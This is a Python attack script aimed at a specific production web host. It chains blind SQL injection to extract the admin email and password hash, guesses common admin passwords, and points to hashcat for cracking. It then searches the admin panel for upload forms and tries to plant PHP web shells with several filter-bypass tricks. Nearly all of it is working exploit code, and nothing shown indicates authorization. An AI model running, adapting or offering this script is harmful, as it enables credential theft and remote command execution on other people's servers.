#!/usr/bin/env python3
"""
Remote Shell via Admin Access
Strategy:
1. Extract admin credentials via SQL injection
2. Login to admin panel
3. Find file upload functionality
4. Upload PHP shell bypassing filters
5. Execute shell on production
"""

import requests
import sys
import re
import time

# PRODUCTION TARGET
BASE_URL = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io"
TARGET = f"{BASE_URL}/instructor-finder"
ADMIN_LOGIN = f"{BASE_URL}/admin/login"
PARAM = "min_age"
THRESHOLD = 150000

def check_condition(condition):
    """Boolean-based blind SQLi check"""
    payload = f"1 AND ({condition})"
    try:
        response = requests.get(TARGET, params={PARAM: payload}, timeout=30)
        return len(response.text) > THRESHOLD
    except Exception as e:
        print(f"Error: {e}")
        return None

def extract_string(query, max_len=100):
    """Extract string via blind injection"""
    result = ""
    for pos in range(1, max_len + 1):
        if not check_condition(f"LENGTH({query}) >= {pos}"):
            break
        low, high = 32, 126
        while low < high:
            mid = (low + high + 1) // 2
            if check_condition(f"ASCII(SUBSTRING({query},{pos},1)) >= {mid}"):
                low = mid
            else:
                high = mid - 1
        result += chr(low)
        print(f"\r[+] {result}", end="", flush=True)
    print()
    return result

def extract_admin_credentials():
    """Extract first admin user credentials"""
    print("\n[*] Finding admin user ID...")
    
    # Get first admin user ID
    for uid in range(1, 20):
        # Check if user with this ID is admin
        if check_condition(f"(SELECT role_name FROM users WHERE id={uid})='admin'"):
            print(f"[+] Admin found at ID: {uid}")
            break
        if check_condition(f"(SELECT role_id FROM users WHERE id={uid})=1"):
            print(f"[+] Admin (role_id=1) found at ID: {uid}")
            break
    else:
        # Try finding any admin
        uid = 1  # Usually admin is ID 1
    
    print(f"\n[*] Extracting email for user ID {uid}...")
    email = extract_string(f"(SELECT email FROM users WHERE id={uid})", 50)
    
    print(f"\n[*] Extracting password hash...")
    password_hash = extract_string(f"(SELECT password FROM users WHERE id={uid})", 65)
    
    return {"id": uid, "email": email, "password_hash": password_hash}

def try_login(email, password):
    """Attempt login with given credentials"""
    session = requests.Session()
    
    try:
        # Get login page for CSRF token
        login_page = session.get(ADMIN_LOGIN, timeout=15)
        csrf_match = re.search(r'name="_token"\s+value="([^"]+)"', login_page.text)
        if not csrf_match:
            csrf_match = re.search(r'value="([^"]+)"\s+name="_token"', login_page.text)
        
        csrf_token = csrf_match.group(1) if csrf_match else ""
        
        login_data = {
            "_token": csrf_token,
            "email": email,
            "password": password,
            "remember": "on"
        }
        
        response = session.post(ADMIN_LOGIN, data=login_data, timeout=15, allow_redirects=False)
        
        if response.status_code == 302:
            location = response.headers.get('Location', '')
            if '/admin' in location and 'login' not in location:
                return True, session
        
        return False, None
    except Exception as e:
        print(f"Login error: {e}")
        return False, None

def find_file_upload(session):
    """Find file upload endpoints in admin panel"""
    print("\n[*] Searching for file upload endpoints...")
    
    endpoints = [
        "/admin/setting",
        "/admin/setting/main_general",
        "/admin/users",
        "/admin/webinars/create",
        "/admin/blog/create",
        "/admin/additional_pages/create",
        "/admin/products/create",
        "/admin/categories/create",
        "/filemanager",
        "/laravel-filemanager",
    ]
    
    for endpoint in endpoints:
        try:
            response = session.get(BASE_URL + endpoint, timeout=15)
            # Check for file upload forms
            if 'type="file"' in response.text or 'enctype="multipart/form-data"' in response.text:
                print(f"[+] File upload found at: {endpoint}")
                
                # Check for specific upload patterns
                if 'image' in response.text.lower() or 'logo' in response.text.lower():
                    print(f"    -> Image upload capability detected")
                    return endpoint, response.text
        except:
            pass
    
    return None, None

def attempt_shell_upload(session, upload_endpoint):
    """Attempt to upload a PHP shell"""
    print(f"\n[*] Attempting shell upload at {upload_endpoint}...")
    
    # Shell payloads with different bypass techniques
    shells = [
        # Standard PHP shell
        ("shell.php", "<?php system($_GET['c']); ?>", "application/x-php"),
        # Double extension
        ("shell.php.jpg", "<?php system($_GET['c']); ?>", "image/jpeg"),
        # Null byte (old PHP)
        ("shell.php%00.jpg", "<?php system($_GET['c']); ?>", "image/jpeg"),
        # .htaccess trick
        (".htaccess", "AddType application/x-httpd-php .jpg", "text/plain"),
        # phtml
        ("shell.phtml", "<?php system($_GET['c']); ?>", "application/x-php"),
        # Short tags
        ("shell.pHp", "<?=`$_GET[c]`?>", "application/octet-stream"),
    ]
    
    for filename, content, content_type in shells:
        try:
            # Get upload page for CSRF
            page = session.get(BASE_URL + upload_endpoint, timeout=15)
            csrf_match = re.search(r'name="_token"\s+value="([^"]+)"', page.text)
            csrf = csrf_match.group(1) if csrf_match else ""
            
            files = {
                'file': (filename, content, content_type),
                'image': (filename, content, content_type),
                'upload': (filename, content, content_type),
            }
            
            data = {'_token': csrf}
            
            response = session.post(
                BASE_URL + upload_endpoint,
                data=data,
                files=files,
                timeout=30
            )
            
            # Check if upload was successful
            if response.status_code in [200, 201, 302]:
                print(f"[+] Uploaded {filename}: Status {response.status_code}")
                
                # Try to find the uploaded file
                potential_paths = [
                    f"/store/{filename}",
                    f"/uploads/{filename}",
                    f"/storage/{filename}",
                    f"/public/store/{filename}",
                ]
                
                for path in potential_paths:
                    try:
                        check = session.get(BASE_URL + path, timeout=10)
                        if check.status_code == 200:
                            print(f"[+] SHELL ACCESSIBLE AT: {BASE_URL}{path}")
                            return BASE_URL + path
                    except:
                        pass
        except Exception as e:
            print(f"[-] Upload attempt failed: {e}")
    
    return None

def main():
    print("=" * 70)
    print("Remote Shell Exploitation via SQL Injection + Admin Access")
    print(f"Target: {BASE_URL}")
    print("=" * 70)
    
    # Step 1: Verify SQLi
    print("\n[STEP 1] Verifying SQL Injection...")
    if not check_condition("1=1"):
        print("[-] SQL Injection not working")
        sys.exit(1)
    print("[+] SQL Injection confirmed on production!")
    
    # Step 2: Extract admin credentials
    print("\n[STEP 2] Extracting Admin Credentials...")
    admin = extract_admin_credentials()
    
    print("\n" + "=" * 70)
    print("EXTRACTED CREDENTIALS")
    print("=" * 70)
    print(f"User ID: {admin['id']}")
    print(f"Email:   {admin['email']}")
    print(f"Hash:    {admin['password_hash']}")
    
    # Step 3: Try common passwords
    print("\n[STEP 3] Trying Common Passwords...")
    common_passwords = [
        "admin", "admin123", "Admin123", "password", "123456", "12345678",
        "rocket", "rocket123", "demo", "demo123", "test", "test123",
        "administrator", "admin@123", "Admin@123", "root", "root123"
    ]
    
    session = None
    for pwd in common_passwords:
        print(f"\r[*] Trying: {pwd}...", end="", flush=True)
        success, session = try_login(admin['email'], pwd)
        if success:
            print(f"\n[+] PASSWORD FOUND: {pwd}")
            break
    
    if not session:
        print("\n[-] No common password worked")
        print(f"\n[*] To crack bcrypt hash, use:")
        print(f"    hashcat -m 3200 '{admin['password_hash']}' rockyou.txt")
        
        # Save for later cracking
        with open("admin_hash.txt", "w") as f:
            f.write(f"# Extracted via SQL Injection\n")
            f.write(f"# Email: {admin['email']}\n")
            f.write(f"{admin['password_hash']}\n")
        print("[+] Hash saved to admin_hash.txt")
        return
    
    # Step 4: Find file upload
    print("\n[STEP 4] Logged in! Finding file upload...")
    upload_endpoint, page_content = find_file_upload(session)
    
    if not upload_endpoint:
        print("[-] No file upload endpoint found")
        print("[*] Manually check admin panel for upload functionality")
        return
    
    # Step 5: Attempt shell upload
    print("\n[STEP 5] Attempting Shell Upload...")
    shell_url = attempt_shell_upload(session, upload_endpoint)
    
    if shell_url:
        print(f"\n{'='*70}")
        print("[+] SHELL SUCCESSFULLY UPLOADED!")
        print(f"[+] URL: {shell_url}?c=whoami")
        print(f"{'='*70}")
    else:
        print("\n[-] Shell upload failed")
        print("[*] The application may have proper security controls")

if __name__ == "__main__":
    main()
